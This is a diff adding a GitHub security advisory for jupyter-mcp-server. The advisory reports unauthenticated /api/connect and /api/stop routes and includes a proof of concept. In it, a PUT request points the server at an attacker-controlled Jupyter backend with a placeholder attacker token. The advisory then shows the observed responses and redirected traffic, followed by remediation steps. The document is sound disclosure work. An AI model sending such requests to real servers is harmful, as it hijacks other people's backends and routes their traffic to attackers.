@@ -1,0 +1,105 @@
+{
+  "id": "GHSA-24pw-rf5p-mgp7",
+  "modified": "2026-11-20T00:15:05.450904825Z",
+  "published": "2026-11-20T00:12:14Z",
+  "aliases": [
+    "CVE-2026-77318"
+  ],
+  "summary": "Jupyter MCP Server: Unauthenticated management routes can hijack the Jupyter backend in standalone HTTP mode",
+  "details": "Standalone `streamable-http` mode in `datalayer/jupyter-mcp-server` requires `MCP_TOKEN` for `/mcp`, but the custom management routes mounted on the same application do not enforce that token. An unauthenticated network caller can invoke `PUT /api/connect`, choose the Jupyter backend URL and token fields, reset the server context, and make the MCP server start a kernel client against attacker-controlled infrastructure. The same missing authentication affects the state-changing `DELETE /api/stop` route.\n\nThe intended authentication boundary is documented in the security guide and enforced during startup:\n\n```text\ndocs/docs/reference/security/index.mdx:15\nAll MCP endpoints require Bearer token authentication.\n\ndocs/docs/reference/security/index.mdx:25\nStarting with version 1.0.0, MCP client authentication is required for the streamable-http transport.\n```\n\nThe CLI enforces that boundary for the MCP endpoint:\n\n```python\n# jupyter_mcp_server/CLI.py:203-209\nif transport == \"streamable-http\" and not mcp_token and not insecure_mcp_noauth:\n    raise click.UsageError(\n        \"streamable-http transport requires MCP client authentication. \"\n        \"Set --mcp-token / MCP_TOKEN, or pass --insecure-mcp-noauth to \"\n        \"explicitly allow unauthenticated access.\"\n    )\n```\n\n```python\n# jupyter_mcp_server/CLI.py:285-290\nif transport == \"streamable-http\":\n    if mcp_token:\n        from jupyter_mcp_server.server import RuntimeTokenVerifier\n        mcp._token_verifier = RuntimeTokenVerifier(mcp_token)\n        logger.info(\"MCP endpoint token authentication enabled (using MCP_TOKEN)\")\n```\n\nThe vulnerable route is `jupyter_mcp_server/server.py:143-187`:\n\n```python\n@mcp.custom_route(\"/api/connect\", [\"PUT\"])\nasync def connect(request: Request):\n    data = await request.json()\n\n    document_runtime = DocumentRuntime(**data)\n\n    set_config(\n        provider=document_runtime.provider,\n        runtime_url=document_runtime.runtime_url,\n        runtime_id=document_runtime.runtime_id,\n        runtime_token=document_runtime.runtime_token,\n        document_url=document_runtime.document_url,\n        document_id=document_runtime.document_id,\n        document_token=document_runtime.document_token,\n        allowed_jupyter_tools=document_runtime.allowed_jupyter_tools or \"notebook_run-all-cells,notebook_get-selected-cell\"\n    )\n\n    ServerContext.reset()\n\n    try:\n        __start_kernel()\n        return JSONResponse({\"success\": True})\n```\n\n`/api/stop` is also unauthenticated and state-changing:\n\n```python\n# jupyter_mcp_server/server.py:190-199\n@mcp.custom_route(\"/api/stop\", [\"DELETE\"])\nasync def stop(request: Request):\n    try:\n        current_notebook = notebook_manager.get_current_notebook() or \"default\"\n        if current_notebook in notebook_manager:\n            notebook_manager.remove_notebook(current_notebook)\n        return JSONResponse({\"success\": True})\n```\n\n## Proof of concept\n\nRun the affected version:\n\n```bash\ngit clone https://github.com/datalayer/jupyter-mcp-server\ncd jupyter-mcp-server\ngit checkout 27b91e551d8bbca2da32c334f9f13267290ff815\npython3.12 -m venv .venv\n. .venv/bin/activate\npython -m pip install -e .\nMCP_TOKEN=SCAN_MCP_TOKEN python -m jupyter_mcp_server \\\n  --transport streamable-http \\\n  --start-new-runtime false \\\n  --jupyterlab false \\\n  --mcp-token SCAN_MCP_TOKEN \\\n  --port 8083\n```\n\nSend a request to the protected MCP endpoint without credentials:\n\n```http\nPOST /mcp HTTP/1.1\nHost: 127.0.0.1:8083\nContent-Type: application/json\nAccept: application/json, text/event-stream\n\n{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{}}\n```\n\nObserved response:\n\n```http\nHTTP/1.1 401 Unauthorized\nwww-authenticate: Bearer error=\"invalid_token\", error_description=\"Authentication required\"\n```\n\nNow send the unauthenticated management request:\n\n```http\nPUT /api/connect HTTP/1.1\nHost: 127.0.0.1:8083\nContent-Type: application/json\n\n{\n  \"provider\": \"jupyter\",\n  \"runtime_url\": \"http://127.0.0.1:9183\",\n  \"runtime_id\": \"\",\n  \"runtime_token\": \"ATTACKER_TOKEN_DIRECT\",\n  \"document_url\": \"http://127.0.0.1:9183\",\n  \"document_id\": \"demo.ipynb\",\n  \"document_token\": \"ATTACKER_TOKEN_DIRECT\"\n}\n```\n\nObserved response:\n\n```http\nHTTP/1.1 200 OK\ncontent-type: application/json\n\n{\"success\":true}\n```\n\nThe server log shows that `/api/connect` accepted the attacker-chosen backend:\n\n```text\nConnect endpoint received - runtime_url: 'http://127.0.0.1:9183',\ndocument_url: 'http://127.0.0.1:9183', provider: jupyter\nStarting the kernel client...\nDefault notebook kernel started successfully\n```\n\nWhen an attacker-controlled backend is listening on `127.0.0.1:9183`, it receives Jupyter API traffic from the MCP server:\n\n```text\nPOST /api/kernels\nAuthorization: Bearer ATTACKER_TOKEN_DIRECT\n\nGET /api/kernels/fake-kernel/channels?...token=ATTACKER_TOKEN_DIRECT\n```\n\n## Impact\n\nAn attacker does not need the `MCP_TOKEN` to mutate the standalone MCP server's active backend connection. The attacker can stop the current notebook kernel through `/api/stop`, replace the configured `runtime_url` and `document_url` through `/api/connect`, and cause the MCP server to initiate Jupyter API and WebSocket traffic to attacker-controlled infrastructure.\n\nFor a same-network attacker, this is a direct unauthenticated state change against the HTTP listener. This defeats the documented standalone HTTP security boundary because the protected `/mcp` endpoint rejects missing credentials while adjacent management routes perform sensitive state changes without the same control.\n\n## Why this is a vulnerability, not intended behavior\n\n- This is not the explicit `--insecure-mcp-noauth` mode. The proof runs with `MCP_TOKEN` configured, and `/mcp` correctly returns `401 Unauthorized` without it.\n- This is not a trusted MCP-client operation. The vulnerable path is a custom HTTP route outside normal JSON-RPC tool dispatch.\n- This is not only a broad-bind issue. The default `0.0.0.0` bind increases exposure, but the boundary failure is that state-changing custom routes bypass the token control applied to `/mcp`.\n\n## Remediation\n\nApply the same inbound authentication policy to every route mounted on the standalone HTTP app:\n\n1. Require the `MCP_TOKEN` bearer token on `/api/connect`, `/api/stop`, `/api/healthz`, and any future custom route that reads or changes server state.\n2. Bind standalone HTTP to `127.0.0.1` by default, and require an explicit host allowlist for non-loopback listeners.\n3. Add regression tests proving that `/api/connect` and `/api/stop` reject missing bearer tokens and invalid bearer tokens.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "jupyter-mcp-server",
+        "purl": "pkg:pypi/jupyter-mcp-server"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.10.0",
+        "0.10.2",
+        "0.11.0",
+        "0.12.0",
+        "0.13.0",
+        "0.14.0",
+        "0.15.0",
+        "0.15.1",
+        "0.15.2",
+        "0.15.4",
+        "0.16.0",
+        "0.16.1",
+        "0.16.2",
+        "0.16.3",
+        "0.17.0",
+        "0.18.0",
+        "0.18.1",
+        "0.18.2",
+        "0.19.0",
+        "0.2.0",
+        "0.20.1",
+        "0.21.0",
+        "0.21.1",
+        "0.21.2",
+        "0.22.0",
+        "0.22.1",
+        "0.23.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.7.0",
+        "0.8.0",
+        "0.9.0",
+        "1.0.0",
+        "1.0.2"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.0.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-24pw-rf5p-mgp7/GHSA-24pw-rf5p-mgp7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/security/advisories/GHSA-24pw-rf5p-mgp7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-77318"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/pull/262"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4d246fc5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/datalayer/jupyter-mcp-server"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/releases/tag/v1.0.3"
+    }
+  ]
+}
